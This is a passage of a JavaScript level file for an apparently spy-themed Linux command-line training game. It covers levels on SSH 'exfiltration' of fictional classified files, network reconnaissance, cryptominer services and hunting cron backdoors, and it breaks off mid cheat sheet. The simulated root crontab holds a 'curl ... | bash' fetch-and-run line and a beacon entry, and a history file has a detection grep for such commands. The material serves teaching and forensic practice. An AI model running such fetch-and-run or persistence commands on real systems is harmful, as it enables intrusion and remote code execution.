        // Theme: Secure tunnel establishment for exfiltration
        // ──────────────────────────────────────────────────────────
        'CLH-021': {
            title: 'SSH Operations',
            description: 'Establish encrypted tunnels for secure intel exfiltration.',
            prerequisites: ['CLH-020'],
            tier: 'CLI Specter',
            user: 'operator',
            hostname: 'SAFEHOUSE',
            startDir: '/home/operator',
            allowedCommands: null,

            filesystem: {
                '/home/operator': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'operator', group: 'operator',
                    children: ['.ssh', 'mission_brief.txt', 'UMBRA_intercepts.tar.gz', 'staging', '.bash_history', '.ssh_cheatsheet']
                },
                '/home/operator/.bash_history': {
                    type: 'file', perms: '-rw-------', owner: 'operator', group: 'operator', size: 312,
                    content: `ssh-keygen -t ed25519 -f ~/.ssh/id_ed25519
ls -la ~/.ssh/
cat ~/.ssh/config
ssh -T relay
scp file.tar.gz user@host:/path/
ssh -L 8080:localhost:80 relay`
                },
                '/home/operator/.ssh_cheatsheet': {
                    type: 'file', perms: '-rw-r--r--', owner: 'operator', group: 'operator', size: 945,
                    content: `╔═══════════════════════════════════════════════════════════════╗
║          SSH OPERATIONS CHEATSHEET                            ║
╚═══════════════════════════════════════════════════════════════╝

KEY GENERATION
─────────────
ssh-keygen -t ed25519           Generate Ed25519 key (recommended)
ssh-keygen -t rsa -b 4096       Generate RSA 4096-bit key
ssh-keygen -f ~/.ssh/mykey      Specify key filename
ssh-keygen -p -f keyfile        Change passphrase

KEY MANAGEMENT
─────────────
ls -la ~/.ssh/                  List SSH directory
cat ~/.ssh/id_ed25519.pub       View public key
chmod 600 ~/.ssh/id_*           Fix key permissions
ssh-copy-id user@host           Deploy public key

CONNECTION
─────────
ssh user@host                   Basic connection
ssh -i keyfile user@host        Specify identity file
ssh -p 2222 user@host           Non-standard port
ssh -T host                     Test connection (no TTY)

FILE TRANSFER
────────────
scp file user@host:/path/       Copy to remote
scp user@host:/path/file .      Copy from remote
scp -r dir/ user@host:/path/    Recursive copy
rsync -avz dir/ user@host:/p/   Sync with progress

TUNNELING
────────
ssh -L 8080:localhost:80 host   Local port forward
ssh -R 8080:localhost:80 host   Remote port forward
ssh -D 1080 host                SOCKS proxy`
                },
                '/home/operator/.ssh': {
                    type: 'dir', perms: 'drwx------', owner: 'operator', group: 'operator',
                    children: ['known_hosts', 'config', 'authorized_keys']
                },
                '/home/operator/.ssh/known_hosts': {
                    type: 'file', perms: '-rw-r--r--', owner: 'operator', group: 'operator', size: 256,
                    content: 'relay.langley.gov ssh-ed25519 AAAAC3NzaC1lZDI1NTE5...[VERIFIED]\nbackup.langley.gov ssh-ed25519 AAAAC3NzaC1lZDI1NTE5...[VERIFIED]'
                },
                '/home/operator/.ssh/config': {
                    type: 'file', perms: '-rw-------', owner: 'operator', group: 'operator', size: 256,
                    content: `# SSH Configuration for OPERATION SILENT RELAY
Host relay
    HostName relay.langley.gov
    User handler
    IdentityFile ~/.ssh/id_ed25519
    Port 22

Host backup
    HostName backup.langley.gov
    User handler
    IdentityFile ~/.ssh/id_ed25519`
                },
                '/home/operator/.ssh/authorized_keys': {
                    type: 'file', perms: '-rw-------', owner: 'operator', group: 'operator', size: 178,
                    content: '# Handler public keys\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5... handler@langley'
                },
                '/home/operator/mission_brief.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'operator', group: 'operator', size: 678,
                    content: `OPERATION SILENT RELAY
======================
Classification: TOP SECRET

Objective: Exfiltrate UMBRA intercepts via SSH tunnel

Handler: RAVEN-7 @ relay.langley.gov
Backup: RAVEN-7 @ backup.langley.gov

Protocol:
1. Generate Ed25519 key pair
2. Verify key in .ssh directory
3. Review SSH config for relay host
4. Test connection to relay
5. Secure copy package to handler

CODENAME: SILENT RELAY
STATUS: ACTIVE`
                },
                '/home/operator/UMBRA_intercepts.tar.gz': {
                    type: 'file', perms: '-rw-------', owner: 'operator', group: 'operator', size: 2516582,
                    content: '[TOP SECRET//UMBRA//NOFORN - Signal intercepts]\nEncrypted package ready for exfiltration\nSHA256: a3b4c5d6e7f8...'
                },
                '/home/operator/staging': {
                    type: 'dir', perms: 'drwx------', owner: 'operator', group: 'operator',
                    children: ['manifest.txt', 'transfer_log.txt']
                },
                '/home/operator/staging/manifest.txt': {
                    type: 'file', perms: '-rw-------', owner: 'operator', group: 'operator', size: 234,
                    content: 'EXFIL MANIFEST\n==============\nPackage: UMBRA_intercepts.tar.gz\nSize: 2.5MB\nClassification: TOP SECRET//UMBRA//NOFORN\nDestination: relay.langley.gov'
                },
                '/home/operator/staging/transfer_log.txt': {
                    type: 'file', perms: '-rw-------', owner: 'operator', group: 'operator', size: 189,
                    content: 'TRANSFER LOG\n============\nPending transfers:\n- UMBRA_intercepts.tar.gz -> relay\n\nCompleted transfers:\n[none]'
                },
            },

            objectives: [
                { id: 1, task: 'GENERATE: SSH Key Pair', hint: '$ ssh-keygen -t ed25519',
                  check: (cmd, state, output) => cmd.includes('ssh-keygen') &&
                         output && (output.includes('Generating') || output.includes('created') || output.includes('id_ed25519')) },
                { id: 2, task: 'VERIFY: Key Created', hint: '$ ls -la ~/.ssh/',
                  check: (cmd, state, output) => cmd.includes('ls') && cmd.includes('.ssh') &&
                         output && (output.includes('id_') || output.includes('config') || output.includes('known_hosts')) },
                { id: 3, task: 'CHECK: SSH Config', hint: '$ cat ~/.ssh/config',
                  check: (cmd, state, output) => cmd.includes('cat') && cmd.includes('config') &&
                         output && (output.includes('Host') || output.includes('relay') || output.includes('HostName')) },
                { id: 4, task: 'TEST: Connection', hint: '$ ssh -T relay (simulated)',
                  check: (cmd, state, output) => cmd.includes('ssh') && !cmd.includes('keygen') &&
                         output && (output.includes('connected') || output.includes('relay') || output.includes('authenticated')) },
                { id: 5, task: 'PREPARE: Secure Transfer', hint: '$ scp UMBRA_intercepts.tar.gz handler@relay:',
                  check: (cmd, state, output) => (cmd.includes('scp') || cmd.includes('rsync')) &&
                         output && (output.includes('transfer') || output.includes('100%') || output.includes('UMBRA')) },
            ],

            insightPhase: {
                enabled: true,
                question: "What is the operation codename for this SSH exfiltration mission?",
                hint: "Check the mission_brief.txt file for the operation codename.",
                hintAfterAttempts: 3,
                acceptedAnswers: ['SILENT RELAY', 'silent relay', 'Silent Relay'],
                correctAnswerMessage: 'Intel confirmed. Operation SILENT RELAY verified — exfil channel is secure.',
                wrongAnswerMessage: 'Negative. Review your findings and try again.',
            },

            remoteHosts: null,
        },

        // ──────────────────────────────────────────────────────────
        // CLH-022: Network Reconnaissance
        // Theme: Mapping network infrastructure
        // ──────────────────────────────────────────────────────────
        'CLH-022': {
            title: 'Network Reconnaissance',
            description: 'Map network infrastructure from a compromised outpost.',
            prerequisites: ['CLH-021'],
            tier: 'CLI Specter',
            user: 'recon',
            hostname: 'OUTPOST-7',
            startDir: '/home/recon',
            allowedCommands: null,

            filesystem: {
                '/home/recon': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'recon', group: 'recon',
                    children: ['scans', 'notes', 'tools', 'reports', '.bash_history', '.network_recon_cheatsheet']
                },
                '/home/recon/.bash_history': {
                    type: 'file', perms: '-rw-------', owner: 'recon', group: 'recon', size: 278,
                    content: `ip addr
ip route
ss -tuln
cat /etc/resolv.conf
ping -c 3 192.168.1.1
netstat -rn
traceroute 10.0.0.1`
                },
                '/home/recon/.network_recon_cheatsheet': {
                    type: 'file', perms: '-rw-r--r--', owner: 'recon', group: 'recon', size: 967,
                    content: `╔═══════════════════════════════════════════════════════════════╗
║          NETWORK RECONNAISSANCE CHEATSHEET                    ║
╚═══════════════════════════════════════════════════════════════╝

INTERFACE ENUMERATION
────────────────────
ip addr                     List all interfaces with IPs
ip link                     List interfaces (link layer)
ifconfig                    Legacy interface listing
hostname -I                 Quick IP listing

ROUTING
──────
ip route                    Show routing table
ip route get 8.8.8.8        Find route to specific host
netstat -rn                 Legacy routing table
route -n                    Alternative routing view

PORT SCANNING
────────────
ss -tuln                    TCP/UDP listening ports
ss -tulnp                   With process names (needs root)
netstat -tuln               Legacy port listing
lsof -i :80                 What's using port 80?

DNS CONFIGURATION
────────────────
cat /etc/resolv.conf        DNS servers
cat /etc/hosts              Local hostname mappings
nslookup hostname           DNS lookup
dig hostname                Detailed DNS query

CONNECTIVITY TESTING
───────────────────
ping -c 3 host              ICMP echo test
traceroute host             Path to destination
mtr host                    Combined ping/traceroute
curl -I http://host         HTTP connectivity

TARGET DISCOVERY (10.0.0.66)
───────────────────────────
Gateway: 10.0.0.1
DNS: 10.0.0.2
Target Server: 10.0.0.66 (HIGH VALUE)`
                },
                '/home/recon/scans': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'recon', group: 'recon',
                    children: ['initial_sweep.txt', 'port_scan.txt', 'service_enum.txt']
                },
                '/home/recon/scans/initial_sweep.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'recon', group: 'recon', size: 678,
                    content: `NETWORK SWEEP RESULTS
=====================
Date: 2024-01-15 02:00 UTC
Operator: recon

DISCOVERED NETWORKS
───────────────────
192.168.1.0/24 - Corporate LAN (user workstations)
10.0.0.0/8 - Internal Services (servers, databases)
172.16.0.0/16 - DMZ (web servers, mail)

HIGH VALUE TARGETS
─────────────────
10.0.0.66 - Database server (MySQL 3306)
10.0.0.88 - File server (SMB 445)
172.16.0.10 - Web server (HTTP 80, HTTPS 443)`
                },
                '/home/recon/scans/port_scan.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'recon', group: 'recon', size: 456,
                    content: `PORT SCAN RESULTS - 10.0.0.66
==============================
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
3306/tcp open  mysql
8080/tcp open  http-proxy

NOTES: Database server - primary exfil target`
                },
                '/home/recon/scans/service_enum.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'recon', group: 'recon', size: 345,
                    content: `SERVICE ENUMERATION
===================
SSH: OpenSSH 8.4
HTTP: Apache 2.4.41
MySQL: 5.7.32
OS: Ubuntu 20.04 LTS`
                },
                '/home/recon/notes': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'recon', group: 'recon',
                    children: ['targets.txt', 'mission.txt']
                },
                '/home/recon/notes/targets.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'recon', group: 'recon', size: 345,
                    content: `PRIORITY TARGETS
================
1. 10.0.0.66 - Database (contains user data)
2. 10.0.0.88 - File server (contains backups)
3. 172.16.0.10 - Web server (entry point)

CODENAME: OUTPOST-7
PRIMARY TARGET IP: 10.0.0.66`
                },
                '/home/recon/notes/mission.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'recon', group: 'recon', size: 289,
                    content: `MISSION: NETWORK MAPPING
========================
Objective: Map internal network from compromised outpost
Priority: Identify database server for data extraction
Report findings to handler before proceeding`
                },
                '/home/recon/tools': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'recon', group: 'recon',
                    children: ['scanner.sh', 'port_check.sh']
                },
                '/home/recon/tools/scanner.sh': {
                    type: 'file', perms: '-rwxr-xr-x', owner: 'recon', group: 'recon', size: 234,
                    content: '#!/bin/bash\n# Network scanner\necho "=== INTERFACES ==="\nip addr\necho "=== ROUTES ==="\nip route\necho "=== LISTENING PORTS ==="\nss -tuln'
                },
                '/home/recon/tools/port_check.sh': {
                    type: 'file', perms: '-rwxr-xr-x', owner: 'recon', group: 'recon', size: 178,
                    content: '#!/bin/bash\n# Quick port check\necho "Checking common ports on $1"\nfor port in 22 80 443 3306; do\n  timeout 1 bash -c "echo >/dev/tcp/$1/$port" 2>/dev/null && echo "$port open"\ndone'
                },
                '/home/recon/reports': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'recon', group: 'recon',
                    children: ['template.txt']
                },
                '/home/recon/reports/template.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'recon', group: 'recon', size: 234,
                    content: 'NETWORK RECON REPORT\n====================\nDate: \nOperator: \nNetwork Ranges: \nKey Targets: \nRecommendations: \n'
                },
            },

            objectives: [
                { id: 1, task: 'CHECK: Network Interfaces', hint: '$ ip addr (or ifconfig)',
                  check: (cmd, state, output) => (cmd.includes('ip addr') || cmd.includes('ip a') || cmd.includes('ifconfig')) &&
                         output && (output.includes('inet') || output.includes('eth') || output.includes('lo')) },
                { id: 2, task: 'VIEW: Routing Table', hint: '$ ip route (or netstat -rn)',
                  check: (cmd, state, output) => (cmd.includes('route') || cmd.includes('netstat')) &&
                         output && (output.includes('default') || output.includes('Gateway') || output.includes('via')) },
                { id: 3, task: 'SCAN: Open Ports', hint: '$ ss -tuln (or netstat -tuln)',
                  check: (cmd, state, output) => (cmd.includes('ss') || (cmd.includes('netstat') && cmd.includes('-'))) &&
                         output && (output.includes('LISTEN') || output.includes('State') || output.includes(':22') || output.includes(':80')) },
                { id: 4, task: 'CHECK: DNS Config', hint: '$ cat /etc/resolv.conf',
                  check: (cmd, state, output) => cmd.includes('resolv') &&
                         output && (output.includes('nameserver') || output.includes('search') || output.includes('dns')) },
                { id: 5, task: 'TEST: Connectivity', hint: '$ ping -c 3 192.168.1.1',
                  check: (cmd, state, output) => (cmd.includes('ping') || cmd.includes('traceroute')) &&
                         output && (output.includes('bytes') || output.includes('icmp') || output.includes('ttl') || output.includes('hop')) },
            ],

            insightPhase: {
                enabled: true,
                question: "What is the IP address of the primary target (database server)?",
                hint: "Check the targets.txt in the notes directory or the initial_sweep.txt scan results.",
                hintAfterAttempts: 3,
                acceptedAnswers: ['10.0.0.66'],
                correctAnswerMessage: 'Intel confirmed. Target 10.0.0.66 locked — database server identified.',
                wrongAnswerMessage: 'Negative. Review your findings and try again.',
            },

            remoteHosts: null,
        },

        // ──────────────────────────────────────────────────────────
        // CLH-023: Service Management
        // Theme: Analyzing services on compromised server
        // ──────────────────────────────────────────────────────────
        'CLH-023': {
            title: 'Service Management',
            description: 'Analyze running services on a compromised server.',
            prerequisites: ['CLH-022'],
            tier: 'CLI Wraith',
            user: 'analyst',
            hostname: 'COMPROMISED-SRV',
            startDir: '/home/analyst',
            allowedCommands: null,

            filesystem: {
                '/home/analyst': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'analyst', group: 'analyst',
                    children: ['analysis', 'reports', 'scripts', '.bash_history', '.systemctl_cheatsheet']
                },
                '/home/analyst/.bash_history': {
                    type: 'file', perms: '-rw-------', owner: 'analyst', group: 'analyst', size: 312,
                    content: `systemctl list-units --type=service
systemctl status sshd
systemctl cat sshd
systemctl --failed
systemctl list-unit-files --state=enabled
journalctl -u sshd -n 50`
                },
                '/home/analyst/.systemctl_cheatsheet': {
                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 945,
                    content: `╔═══════════════════════════════════════════════════════════════╗
║          SERVICE MANAGEMENT CHEATSHEET                        ║
╚═══════════════════════════════════════════════════════════════╝

SERVICE LISTING
──────────────
systemctl list-units --type=service    Running services
systemctl list-units --all             All units (including inactive)
systemctl list-unit-files              All installed unit files
systemctl list-unit-files --state=enabled  Enabled services

SERVICE STATUS
─────────────
systemctl status <service>      Detailed service status
systemctl is-active <service>   Check if running
systemctl is-enabled <service>  Check if enabled at boot
systemctl show <service>        All service properties

SERVICE CONFIGURATION
────────────────────
systemctl cat <service>         View unit file contents
systemctl edit <service>        Edit unit file (override)
systemctl daemon-reload         Reload after config changes

TROUBLESHOOTING
──────────────
systemctl --failed              List failed services
journalctl -u <service>         View service logs
journalctl -u <service> -f      Follow logs in real-time
journalctl -u <service> -n 50   Last 50 log entries

ANALYST NOTES
─────────────
High CPU usage detected on this server. Unknown processes.
Use systemctl to identify services not in baseline.`
                },
                '/home/analyst/analysis': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'analyst', group: 'analyst',
                    children: ['services.txt', 'suspicious.txt', 'baseline.txt']
                },
                '/home/analyst/analysis/services.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 567,
                    content: `RUNNING SERVICES INVENTORY
==========================
Date: 2026-01-15
Status: INCOMPLETE - Manual review required

Known legitimate services on baseline:
- sshd.service
- nginx.service
- mysql.service
- cron.service

WARNING: Additional services detected that are NOT in baseline.
Run 'systemctl list-units --type=service' to enumerate.
Compare against baseline.txt to identify anomalies.`
                },
                '/home/analyst/analysis/suspicious.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 456,
                    content: `SUSPICIOUS ACTIVITY REPORT
==========================
Date: 2026-01-15
Analyst: [REDACTED - previous analyst compromised]

ANOMALIES DETECTED:
-------------------
1. CPU consistently at 95-100% utilization
2. Unknown outbound connections on port 4444
3. Scheduled task calling external endpoint

RECOMMENDED ACTIONS:
- Enumerate all running services
- Check service configurations with 'systemctl cat <service>'
- Look for mining pool addresses in config files
- Identify the mining pool used by the cryptominer

NOTE: Mining pool address format is typically: pool.domain.com:port`
                },
                '/home/analyst/analysis/baseline.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 345,
                    content: `BASELINE SERVICES (Known Good)
==============================
sshd.service
nginx.service
mysql.service
cron.service
systemd-*
networking.service

Any service NOT on this list requires investigation.`
                },
                '/home/analyst/reports': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'analyst', group: 'analyst',
                    children: ['template.txt', 'findings.txt']
                },
                '/home/analyst/reports/template.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 234,
                    content: 'SERVICE ANALYSIS REPORT\n=======================\nDate: \nAnalyst: \nTotal Services: \nSuspicious: \nRecommendations: \n'
                },
                '/home/analyst/reports/findings.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 289,
                    content: `PRELIMINARY FINDINGS
====================
Status: INCOMPLETE

Initial observations:
- Server compromised approximately 5 days ago
- Multiple unauthorized services installed
- High CPU usage indicates possible cryptomining

NEXT STEPS:
1. Use systemctl to list all services
2. Compare against baseline
3. Examine suspicious service configs with 'systemctl cat'
4. Document mining pool address for threat intel`
                },
                '/home/analyst/scripts': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'analyst', group: 'analyst',
                    children: ['audit_services.sh']
                },
                '/home/analyst/scripts/audit_services.sh': {
                    type: 'file', perms: '-rwxr-xr-x', owner: 'analyst', group: 'analyst', size: 312,
                    content: '#!/bin/bash\necho "=== SERVICE AUDIT ==="\necho "Running services:"\nsystemctl list-units --type=service --state=running\necho "\\n=== Failed services:"\nsystemctl --failed'
                },
            },

            objectives: [
                { id: 1, task: 'LIST: Running Services', hint: '$ systemctl list-units --type=service',
                  check: (cmd, state, output) => cmd.includes('systemctl') && cmd.includes('list') &&
                         output && (output.includes('service') || output.includes('loaded') || output.includes('running')) },
                { id: 2, task: 'CHECK: Service Status', hint: '$ systemctl status sshd',
                  check: (cmd, state, output) => cmd.includes('systemctl') && cmd.includes('status') &&
                         output && (output.includes('Active') || output.includes('running') || output.includes('loaded')) },
                { id: 3, task: 'VIEW: Service Config', hint: '$ systemctl cat sshd',
                  check: (cmd, state, output) => cmd.includes('systemctl') && cmd.includes('cat') &&
                         output && (output.includes('[Unit]') || output.includes('[Service]') || output.includes('ExecStart')) },
                { id: 4, task: 'FIND: Failed Services', hint: '$ systemctl --failed',
                  check: (cmd, state, output) => cmd.includes('systemctl') && cmd.includes('failed') &&
                         output && (output.includes('failed') || output.includes('UNIT') || output.includes('0 loaded')) },
                { id: 5, task: 'LIST: Enabled Services', hint: '$ systemctl list-unit-files --state=enabled',
                  check: (cmd, state, output) => cmd.includes('systemctl') && cmd.includes('enabled') &&
                         output && (output.includes('enabled') || output.includes('unit files') || output.includes('.service')) },
            ],

            insightPhase: {
                enabled: true,
                question: "What is the mining pool address being used by the cryptominer? (format: domain:port)",
                hint: "Use 'systemctl cat' on suspicious services to view their configuration.",
                hintAfterAttempts: 3,
                acceptedAnswers: ['darkpool.monero.net:3333', 'stratum+tcp://darkpool.monero.net:3333'],
                correctAnswerMessage: 'Intel confirmed. Mining pool darkpool.monero.net:3333 identified — threat intel updated.',
                wrongAnswerMessage: 'Negative. Review your findings and try again.',
            },

            remoteHosts: null,
        },

        // ──────────────────────────────────────────────────────────
        // CLH-024: Scheduled Tasks (Cron)
        // Theme: Finding persistence mechanisms
        // ──────────────────────────────────────────────────────────
        'CLH-024': {
            title: 'Scheduled Tasks',
            description: 'Hunt for malicious cron jobs and persistence mechanisms.',
            prerequisites: ['CLH-023'],
            tier: 'CLI Wraith',
            user: 'operator',
            hostname: 'BEACON-NODE',
            startDir: '/home/operator',
            allowedCommands: null,

            filesystem: {
                '/home/operator': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'operator', group: 'operator',
                    children: ['analysis', 'scripts', '.bash_history', '.cron_cheatsheet']
                },
                '/home/operator/.bash_history': {
                    type: 'file', perms: '-rw-------', owner: 'operator', group: 'operator', size: 289,
                    content: `crontab -l
cat /etc/crontab
ls -la /etc/cron.d/
find /etc/cron.d -type f
cat /etc/cron.d/backdoor
grep -r "curl\\|wget\\|bash" /etc/cron.d/`
                },
                '/home/operator/.cron_cheatsheet': {
                    type: 'file', perms: '-rw-r--r--', owner: 'operator', group: 'operator', size: 923,
                    content: `╔═══════════════════════════════════════════════════════════════╗
║          CRON & SCHEDULED TASKS CHEATSHEET                    ║
╚═══════════════════════════════════════════════════════════════╝

USER CRONTABS
────────────
crontab -l                  List current user's crontab
crontab -e                  Edit current user's crontab
crontab -l -u username      List another user's crontab (root)

SYSTEM CRON LOCATIONS
────────────────────
/etc/crontab                System crontab
/etc/cron.d/                Drop-in cron files
/etc/cron.hourly/           Hourly scripts
/etc/cron.daily/            Daily scripts
/etc/cron.weekly/           Weekly scripts
/etc/cron.monthly/          Monthly scripts
/var/spool/cron/crontabs/   User crontabs

CRON SYNTAX
──────────
* * * * * command
│ │ │ │ │
│ │ │ │ └── Day of week (0-7)
│ │ │ └──── Month (1-12)
│ │ └────── Day of month (1-31)
│ └──────── Hour (0-23)
└────────── Minute (0-59)

SUSPICIOUS INDICATORS
────────────────────
- curl/wget piped to bash
- Jobs running from /tmp or hidden dirs
- Base64 encoded commands
- Unusual frequency (*/1, */5, */10)
- Files in /etc/cron.d/ not matching baseline

INVESTIGATION STEPS:
1. List cron directories: ls -la /etc/cron.d/
2. Read suspicious entries: cat /etc/cron.d/<file>
3. Decode cron timing: first field = minutes`
                },
                '/home/operator/analysis': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'operator', group: 'operator',
                    children: ['cron_audit.txt', 'suspicious_jobs.txt']
                },
                '/home/operator/analysis/cron_audit.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'operator', group: 'operator', size: 456,
                    content: `CRON AUDIT RESULTS
==================
Date: 2024-01-15
Status: INCOMPLETE - Needs manual review

BASELINE (Known Good):
- /etc/crontab: Standard system jobs
- /etc/cron.d/e2scrub_all: Filesystem check
- /etc/cron.d/popularity-contest: Ubuntu stats

ANOMALIES DETECTED:
- /etc/cron.d/ contains 3 files (baseline = 2)
- /var/spool/cron/crontabs/root has non-standard entries

TODO:
1. ls -la /etc/cron.d/ to identify extra files
2. cat each file to read cron entries
3. Decode the timing from cron syntax`
                },
                '/home/operator/analysis/suspicious_jobs.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'operator', group: 'operator', size: 567,
                    content: `SUSPICIOUS CRON LOCATIONS
=========================
INVESTIGATE THE FOLLOWING:

1. /var/spool/cron/crontabs/root
   - Contains non-standard entries
   - Check for external connections

2. /etc/cron.d/
   - May contain attacker-placed files
   - Compare against known system cron jobs:
     * e2scrub_all (legitimate)
     * popularity-contest (legitimate)
     * Any other files = INVESTIGATE

ACTION: Read each suspicious cron file and decode the timing.
CRON FORMAT: minute hour day month weekday command
Example: */5 = every 5 minutes, 0 * = every hour at minute 0`
                },
                '/home/operator/scripts': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'operator', group: 'operator',
                    children: ['audit_cron.sh']
                },
                '/home/operator/scripts/audit_cron.sh': {
                    type: 'file', perms: '-rwxr-xr-x', owner: 'operator', group: 'operator', size: 312,
                    content: '#!/bin/bash\necho "=== CRON AUDIT ==="\necho "System crontab:"\ncat /etc/crontab\necho "\\n=== Cron.d:"\nls -la /etc/cron.d/\necho "\\n=== User crontabs:"\nls -la /var/spool/cron/crontabs/'
                },
                '/var/spool/cron/crontabs': {
                    type: 'dir', perms: 'drwx-wx--T', owner: 'root', group: 'crontab',
                    children: ['root', 'operator']
                },
                '/var/spool/cron/crontabs/root': {
                    type: 'file', perms: '-rw-------', owner: 'root', group: 'crontab', size: 256,
                    content: '# Root crontab - COMPROMISED\n# Legitimate entries removed for brevity\n\n# MALICIOUS - C2 beacon\n*/5 * * * * /tmp/.hidden/beacon.sh\n\n# MALICIOUS - Remote code execution\n0 * * * * curl http://10.0.0.88/update | bash'
                },
                '/var/spool/cron/crontabs/operator': {
                    type: 'file', perms: '-rw-------', owner: 'operator', group: 'crontab', size: 89,
                    content: '# Operator crontab\n# No entries - clean'
                },
                '/etc/cron.d': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
                    children: ['e2scrub_all', 'popularity-contest', 'backdoor']
                },
                '/etc/cron.d/e2scrub_all': {
                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root', size: 178,
                    content: '# Legitimate system maintenance\n30 3 * * 0 root test -e /run/systemd/system || /usr/sbin/e2scrub_all -A'
                },
                '/etc/cron.d/popularity-contest': {
                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root', size: 156,
                    content: '# Ubuntu package popularity contest\nPATH=/usr/bin\n*/30 * * * * root /usr/sbin/popularity-contest'
                },
                '/etc/cron.d/backdoor': {
                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root', size: 178,
                    content: '# MALICIOUS - Persistence mechanism\n# Added by attacker on 2024-01-10\n*/10 * * * * root /opt/.malware/persist.sh'
                },
                '/etc/crontab': {
                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root', size: 512,
                    content: 'SHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n\n# Standard system crontab entries\n17 * * * * root cd / && run-parts --report /etc/cron.hourly\n25 6 * * * root test -x /usr/sbin/anacron || run-parts --report /etc/cron.daily\n47 6 * * 7 root test -x /usr/sbin/anacron || run-parts --report /etc/cron.weekly'
                },
            },

            objectives: [
                { id: 1, task: 'LIST: User Crontab', hint: '$ crontab -l',
                  check: (cmd, state, output) => cmd.includes('crontab') && cmd.includes('-l') &&
                         output && (output.includes('no crontab') || output.includes('*') || output.includes('crontab')) },
                { id: 2, task: 'CHECK: System Crontab', hint: '$ cat /etc/crontab',
                  check: (cmd, state, output) => cmd.includes('cat') && cmd.includes('crontab') &&
                         output && (output.includes('SHELL') || output.includes('PATH') || output.includes('root')) },
                { id: 3, task: 'SEARCH: Cron Directories', hint: '$ ls -la /etc/cron.d/',
                  check: (cmd, state, output) => cmd.includes('ls') && cmd.includes('cron') &&
                         output && (output.includes('backdoor') || output.includes('cron') || output.includes('-rw')) },
                { id: 4, task: 'FIND: All Cron Jobs', hint: '$ find /etc/cron.d -type f',
                  check: (cmd, state, output) => cmd.includes('find') && cmd.includes('cron') &&
                         output && (output.includes('/etc/cron') || output.includes('crontab') || output.includes('backdoor')) },
                { id: 5, task: 'ANALYZE: Suspicious Entry', hint: '$ cat /etc/cron.d/backdoor',
                  check: (cmd, state, output) => cmd.includes('cat') && cmd.includes('backdoor') &&
                         output && (output.includes('persist') || output.includes('MALICIOUS') || output.includes('*/10')) },
            ],

            insightPhase: {
                enabled: true,
                question: "You found a suspicious file in /etc/cron.d/. How often (in minutes) does this persistence mechanism execute?",
                hint: "Run 'ls /etc/cron.d/' to find the extra file, then 'cat' it. The first field in cron syntax is minutes (*/N = every N minutes).",
                hintAfterAttempts: 3,
                acceptedAnswers: ['10', '10 minutes', 'every 10 minutes', '*/10'],
                correctAnswerMessage: 'Intel confirmed. Persistence mechanism fires every 10 minutes — cron backdoor documented.',
                wrongAnswerMessage: 'Negative. Review your findings and try again.',
            },

            remoteHosts: null,
        },

        // ──────────────────────────────────────────────────────────
        // CLH-025: Package Management
        // Theme: Forensic analysis of installed packages
        // ──────────────────────────────────────────────────────────
        'CLH-025': {
            title: 'Package Management',
            description: 'Analyze installed packages for unauthorized software.',
            prerequisites: ['CLH-024'],
            tier: 'CLI Wraith',
            user: 'analyst',
            hostname: 'FORENSIC-WS',
            startDir: '/home/analyst',
            allowedCommands: null,

            filesystem: {
                '/home/analyst': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'analyst', group: 'analyst',
                    children: ['package_audit', 'reports', 'evidence', '.bashrc', '.bash_history', '.package_cheatsheet']
                },
                '/home/analyst/.bash_history': {
                    type: 'file', perms: '-rw-------', owner: 'analyst', group: 'analyst', size: 312,
                    content: `dpkg -l | head -20
dpkg -l | grep -i ssh
dpkg -s openssh-server
grep " install " /var/log/dpkg.log
dpkg -V openssh-server
apt list --installed 2>/dev/null | wc -l
dpkg --get-selections | grep -v deinstall`
                },
                '/home/analyst/.package_cheatsheet': {
                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 1536,
                    content: `╔═══════════════════════════════════════════════════════════════╗
║              PACKAGE MANAGEMENT CHEATSHEET                    ║
╠═══════════════════════════════════════════════════════════════╣
║ LIST PACKAGES:                                                ║
║   dpkg -l                    # All installed (deb format)     ║
║   dpkg -l | grep ^ii         # Only installed packages        ║
║   apt list --installed       # APT format listing             ║
║   dpkg --get-selections      # Selection states               ║
║                                                               ║
║ SEARCH PACKAGES:                                              ║
║   dpkg -l | grep <pattern>   # Search by name                 ║
